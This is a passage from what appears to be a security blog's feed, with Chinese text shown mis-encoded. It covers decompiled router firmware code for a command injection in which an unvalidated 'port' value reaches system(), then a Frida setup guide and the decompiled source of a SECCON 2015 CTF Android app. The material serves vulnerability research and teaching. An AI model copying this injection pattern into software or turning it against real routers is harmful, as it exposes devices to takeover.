æ˜¯äºŒè¿›åˆ¶è„šæœ¬ æ— æ³•æ­£å¸¸pcallåŠ è½½ è°ƒç”¨glc_call</span><br><span class="line">            ngx.log(ngx.ERR, tb)</span><br><span class="line">            return glc_call(object, method, args)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        if type(tb) == &quot;table&quot; then</span><br><span class="line">            local funs = &#123;&#125;</span><br><span class="line">            for k, v in pairs(tb) do</span><br><span class="line">                if type(v) == &quot;function&quot; then</span><br><span class="line">                    funs[k] = v</span><br><span class="line">                end</span><br><span class="line">            end</span><br><span class="line">            objects[object] = funs</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local fn = objects[object] and objects[object][method]   --- æ— æ³•è°ƒç”¨ </span><br><span class="line">    if not fn  then</span><br><span class="line">        return glc_call(object, method, args)      ---ä½¿ç”¨glc_call å‚æ•°s2s enable_echo_server &#123;....&#125;</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    return fn(args)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>è°ƒç”¨glc_callï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">local function glc_call(object, method, args)   --- s2s enable_echo_server &#123;....&#125;</span><br><span class="line">    ngx.log(ngx.DEBUG, &quot;call C: &#x27;&quot;, object, &quot;.&quot;, method, &quot;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    local res = ngx.location.capture(&quot;/cgi-bin/glc&quot;, &#123;   ---- å‘èµ·ä¸€ä¸ªå†…éƒ¨è¯·æ±‚åˆ° /cgi-bin/glc POSTè¯·æ±‚ å‚æ•°å¦‚ä¸‹ï¼ˆè¿™æ˜¯Openrestyå¹³å°çš„luaç”¨æ³•ï¼‰</span><br><span class="line">        method = ngx.HTTP_POST,</span><br><span class="line">        body = cjson.encode(&#123;</span><br><span class="line">            object = object,</span><br><span class="line">            method = method,</span><br><span class="line">            args = args or &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    if res.status ~= ngx.HTTP_OK then return M.ERROR_CODE_INTERNAL_ERROR end</span><br><span class="line"></span><br><span class="line">    local body = res.body</span><br><span class="line">    local code = tonumber(body:match(&quot;(-?%d+)&quot;))</span><br><span class="line"></span><br><span class="line">    if code ~= M.ERROR_CODE_NONE then</span><br><span class="line">        local err_msg = body:match(&quot;%d+ (.+)&quot;)</span><br><span class="line">        if err_msg then</span><br><span class="line">            ngx.log(ngx.ERR, err_msg)</span><br><span class="line">        end</span><br><span class="line">        return code</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local msg = body:match(&quot;%d+ (.*)&quot;)</span><br><span class="line"></span><br><span class="line">    return cjson.decode(msg)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><strong>&#x2F;cgi-bin&#x2F;glcï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  snprintf(rpc_lib_path, 0x80u, &quot;%s/%s.so&quot;, &quot;/usr/lib/oui-httpd/rpc&quot;, v30);//v30ç”±params[1]ä¼ å…¥,ä¸ºs2s</span><br><span class="line">  dl_handle = dlopen(rpc_lib_path, 2);          // åŠ¨æ€åŠ è½½å…±äº«åº“</span><br><span class="line">  dl_handle_copy = dl_handle;</span><br><span class="line">  if ( !dl_handle )</span><br><span class="line">  &#123;</span><br><span class="line">    dl_error_msg = dlerror();</span><br><span class="line">    printf(&quot;%d dlopen: %s&quot;, -32601, dl_error_msg);</span><br><span class="line">    goto LABEL_37;</span><br><span class="line">  &#125;</span><br><span class="line">  json_rpc_function = (int (__fastcall *)(int, int))dlsym(dl_handle, name);  //åŠ è½½ç¬¦å· nameç”±params[2]ä¼ å…¥</span><br><span class="line">  if ( json_rpc_function )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( argc &gt; 3 )</span><br><span class="line">      json_params = json_loads((int)argv[3], 0, 0);    // json_params</span><br><span class="line">    if ( !json_params )</span><br><span class="line">      json_params = ::json_object();</span><br><span class="line">    json_object_new = ::json_object();</span><br><span class="line">    json_response_object = json_object_new;</span><br><span class="line">    if ( logging_enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      __gl_log(69505, 116, 0, &quot;glc call meth %s/%s\n&quot;, v30, name);</span><br><span class="line">      json_rpc_return = json_rpc_function(json_params, json_response_object);   // ä»¥json_paramsä¸ºå‚æ•°è°ƒç”¨json_rpc_functionï¼Œå³ä¸Šè¿°params[1]çš„params[2]å‡½æ•°</span><br><span class="line">      __gl_log(69505, 118, 0, &quot;glc call end,ret = %d\n&quot;, json_rpc_return);</span><br><span class="line">      printf(&quot;%d&quot;, json_rpc_return);</span><br><span class="line">      if ( json_rpc_return )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_30:</span><br><span class="line">        sub_10990(json_params);</span><br><span class="line">        sub_10990(json_response_object);</span><br><span class="line">        goto LABEL_41;</span><br><span class="line">      &#125;</span><br><span class="line">      json_response_str = (const char *)json_dumps(json_response_object, 0);</span><br><span class="line">      __gl_log(69505, 121, 0, &quot;glc call result %s\n&quot;, json_response_str);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      json_rpc_call = json_rpc_function(json_params, json_object_new);</span><br><span class="line">      printf(&quot;%d&quot;, json_rpc_call);</span><br><span class="line">      if ( json_rpc_call )</span><br><span class="line">        goto LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    final_response_str = (const char *)json_dumps(json_response_object, 0);</span><br><span class="line">    printf(&quot; %s&quot;, final_response_str);</span><br><span class="line">    goto LABEL_30;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°è°ƒç”¨çš„æ˜¯s2s.soæ–‡ä»¶çš„enable_echo_serverå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">backupValue = *(_DWORD *)off_16FC0;</span><br><span class="line">memset(commandBuffer, 0, sizeof(commandBuffer));</span><br><span class="line">portObject = json_object_get(jsonInput, &quot;port&quot;);   ///ä»å‚æ•°ä¸­è·å–porté”®å€¼å¯¹</span><br><span class="line">portString = (const char *)json_string_value(portObject);   //è·å–é”®å€¼</span><br><span class="line">if ( *portString )</span><br><span class="line">&#123;</span><br><span class="line">  portValue = portString;</span><br><span class="line">  if ( atoi(portString) &gt; 0 &amp;&amp; atoi(portValue) &lt;= 65534 )  /// åªæ¯”è¾ƒäº†å¤§å°ï¼Œæ²¡æœ‰æ£€æŸ¥ç±»å‹</span><br><span class="line">  &#123;</span><br><span class="line">    if ( check_file_is_exist(&quot;/usr/bin/echo_server&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      formatCommand = (void (*)(_BYTE *, int, const char *, ...))snprintf_0;</span><br><span class="line">      snprintf_0(commandBuffer, 128, &quot;kill -9 $(pgrep -f \&quot;%s\&quot;)&quot;, &quot;/usr/bin/echo_server&quot;);</span><br><span class="line">      executeCommand = (int (__fastcall *)(_BYTE *))system_0;</span><br><span class="line">      system_0(commandBuffer);</span><br><span class="line">      formatCommand(commandBuffer, 128, &quot;%s -p %s -f&quot;, &quot;/usr/bin/echo_server&quot;, portValue);//å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">      commandOutput = executeCommand(commandBuffer);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‘½ä»¤æ³¨å…¥æ˜¾ç„¶æ˜¯æ‰§è¡Œæœ¬åœ°æ³¨å…¥çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°&quot;&gt;&lt;a href=&quot;#ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°&quot;&gt;&lt;/a&gt;ä¸€äº›è·¯ç”±å™¨æ¼æ´å¤ç°&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>androidä¹‹hookå…¥é—¨</title>
    <link href="http://s1nec-1o.github.io/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/"/>
    <id>http://s1nec-1o.github.io/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/</id>
    <published>2025-03-28T12:10:45.000Z</published>
    <updated>2025-03-28T12:34:03.601Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Androidè¿è¡Œæœºåˆ¶"><a href="#Androidè¿è¡Œæœºåˆ¶" class="headerlink" title="Androidè¿è¡Œæœºåˆ¶"></a>Androidè¿è¡Œæœºåˆ¶</h2><p>ä¸€èˆ¬è€Œè¨€ï¼Œåœ¨å¯åŠ¨ä¸€ä¸ª App æ—¶ï¼ŒAndroid ä¼šé¦–å…ˆæ‰§è¡Œ Application ç±»ï¼ˆAndroidManifest.xml æ–‡ä»¶ä¸­æ³¨æ˜ï¼‰çš„åˆ›å»ºå·¥ä½œï¼Œç„¶åå†å¼€å§‹æ‰§è¡Œ Main Activityï¼Œç»§è€Œæ ¹æ®å„ç§å„æ ·çš„é€»è¾‘æ‰§è¡Œç›¸å…³ä»£ç ã€‚</p><h2 id="Android-é€†å‘"><a href="#Android-é€†å‘" class="headerlink" title="Android é€†å‘"></a>Android é€†å‘</h2><ul><li>åˆ†ææ–¹æ³•ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹å¼<ul><li>é™æ€åˆ†æï¼Œå¯¹æºä»£ç è¿›è¡Œé€†å‘ï¼Œç„¶åé˜…è¯»åˆ†æ</li><li>åŠ¨æ€åˆ†æï¼Œå¯¹ä»£ç è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œä¸€èˆ¬æ¥è¯´åŠ¨æ€åˆ†æç¦»ä¸å¼€é™æ€åˆ†æã€‚</li></ul></li><li>åˆ†æå¯¹è±¡ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç±»å¯¹è±¡<ul><li>javaå±‚ä»£ç </li><li>åŸç”Ÿå±‚ä»£ç </li></ul></li></ul><p>Android é€†å‘ä¸»è¦åº”ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹å‘</p><ol><li>app å®‰å…¨å®¡æŸ¥</li><li>ç³»ç»Ÿæ¼æ´æŒ–æ˜</li><li>æ¶æ„ä»£ç æ€æŸ¥</li><li>åŒè¡Œä¸šäº§å“æŠ€æœ¯åŸç†åˆ†æ</li><li>ç§»é™¤å®‰å…¨æœºåˆ¶</li></ol><p><strong>AndroidManifest.xml æ–‡ä»¶</strong></p><ul><li>è½¯ä»¶åŒ…å</li><li>apk ä¸»æ´»åŠ¨ï¼Œéšè—ç¨‹åºæ²¡æœ‰ä¸» Activity</li></ul><p><strong>Application åœ¨ java å±‚å¯åŠ¨æœ€æ—©</strong></p><h3 id="é€†å‘æŠ€å·§"><a href="#é€†å‘æŠ€å·§" class="headerlink" title="é€†å‘æŠ€å·§"></a>é€†å‘æŠ€å·§</h3><p><strong>å­—ç¬¦ä¸²å®šä½ï¼š</strong></p><ul><li>ç¨‹åºæŠ¥é”™ä¿¡æ¯</li><li>æœåŠ¡</li><li>å¹¿æ’­</li></ul><p><strong>æ•æ„ŸAPIå®šä½ï¼š</strong></p><ul><li>æ§ä»¶çš„äº‹ä»¶å‡½æ•°<ul><li>onclick</li><li>show</li><li>Toast</li></ul></li><li>ç½‘ç»œå‡½æ•°<ul><li>HttpGet</li><li>HttpPost</li><li>HttpUriRequest</li><li>socket</li></ul></li><li>å‘é€çŸ­ä¿¡</li><li>æ‰“ç”µè¯</li><li>å®šä½</li><li>ç­‰ç­‰</li></ul><p><strong>logä¿¡æ¯ï¼š</strong></p><ul><li>åˆ©ç”¨ç¨‹åºæœ¬èº«äº§ç”Ÿçš„ log ä¿¡æ¯</li><li>è‡ªå·±å¯¹ä»£ç åç¼–è¯‘ï¼Œæ’å…¥ log ä¿¡æ¯ï¼Œå¹¶é‡æ‰“åŒ…æ¥è¿›è¡Œåˆ†æã€‚</li></ul><p><strong>æ ˆè·Ÿè¸ªï¼š</strong></p><p>æˆ‘ä»¬å¯ä»¥ç”¨ ddms æä¾›çš„æ–¹æ³•è°ƒç”¨é“¾çš„ä¿¡æ¯æ¥åˆ¤æ–­ç¨‹åºç›®å‰çš„è°ƒç”¨å…³ç³»å¦‚ä½•ã€‚</p><p><strong>é’©å­ï¼š</strong> </p><ul><li>xposed</li><li>cydia</li></ul><p><strong>monitorï¼š</strong></p><ul><li>è¿è¡Œ logï¼Œç¨‹åºè¿è¡Œäº§ç”Ÿçš„ï¼Œç³»ç»Ÿè¿è¡Œäº§ç”Ÿçš„</li><li>çº¿ç¨‹è·Ÿè¸ª</li><li>æ–¹æ³•è°ƒç”¨é“¾</li></ul><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>mumuæ¨¡æ‹Ÿå™¨ã€adbã€jadxå’Œfrida</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win</span></span><br><span class="line">adb connect 127.0.0.1:16384  # mumu-&gt;é—®é¢˜è¯Šæ–­ adbè°ƒè¯•ç«¯å£16384</span><br><span class="line">adb devices                       #æ˜¾ç¤ºå·²è¿æ¥è®¾å¤‡</span><br><span class="line">adb shell getprop ro.product.cpu.abi #æŸ¥çœ‹ç³»ç»Ÿå‹å·</span><br><span class="line">adb push frida-server-16.6.6-android-x86_64 /data/local/tmp #å°†frida-server pushè¿›æ¨¡æ‹Ÿå™¨</span><br><span class="line">adb root #root</span><br><span class="line">adb shell #rootè¿›shell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell</span></span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod 755 frida-server-16.6.6-android-x86_64</span><br><span class="line">./frida-server-16.6.6-android-x86_64</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win</span></span><br><span class="line">frida-ps -U #é€šè¿‡USBè¿æ¥æŸ¥çœ‹è¿›ç¨‹æƒ…å†µ</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">frida-ps -R #é€šè¿‡è¿œç¨‹è¿æ¥æŸ¥çœ‹è¿›ç¨‹æƒ…å†µ</span><br></pre></td></tr></table></figure><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><p><a href="https://blog.potatowo.top/2025/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Frida/game.apk">é“¾æ¥</a></p><p><code>frida-ps -U</code>æ‰¾åˆ°è¿›ç¨‹å·</p><p><code>frida -U -p 3897</code></p><p>ä¸€ä¸ªç®€å•çš„çŸ³å¤´å‰ªåˆ€å¸ƒçš„æ¸¸æˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seccon2015.rock_paper_scissors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> extends Activity implements View.OnClickListener &#123;</span><br><span class="line">    Button P;</span><br><span class="line">    Button S;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    Button r;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> <span class="built_in">Handler</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask = <span class="keyword">new</span> <span class="built_in">Runnable</span>() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">        @Override <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">run</span>() &#123;</span><br><span class="line">            TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;DRAW +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> native <span class="type">int</span> <span class="title">calc</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> &#123;</span><br><span class="line">        System.<span class="built_in">loadLibrary</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">        <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">        <span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line">        <span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br><span class="line">        <span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">            TextView tv3 = (TextView) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            TextView tv = (TextView) <span class="built_in">findViewById</span>(R.id.textView);</span><br><span class="line">            TextView tv2 = (TextView) <span class="built_in">findViewById</span>(R.id.textView2);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            Random rm = <span class="keyword">new</span> <span class="built_in">Random</span>();</span><br><span class="line">            <span class="keyword">this</span>.n = rm.<span class="built_in">nextInt</span>(<span class="number">3</span>);</span><br><span class="line">            String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">            tv2.<span class="built_in">setText</span>(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.handler.<span class="built_in">postDelayed</span>(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android ä¼šé¦–å…ˆæ‰§è¡Œ Application ç±»ï¼Œä½†æ˜¯å¼€å‘è€…ä¸€èˆ¬æ˜¯ä¸éœ€è¦å»å¤„ç†å®ƒçš„ï¼Œå¯¹äºActivityæ¥è¯´ï¼Œæ ‡å‡†çš„ç”Ÿå‘½å‘¨æœŸå…¥å£ç‚¹æ˜¯ï¼š**<code>onCreate()</code> æ–¹æ³•**ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡é‡å†™æ¥è°ƒç”¨æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ–¹æ³•</p><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Override <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    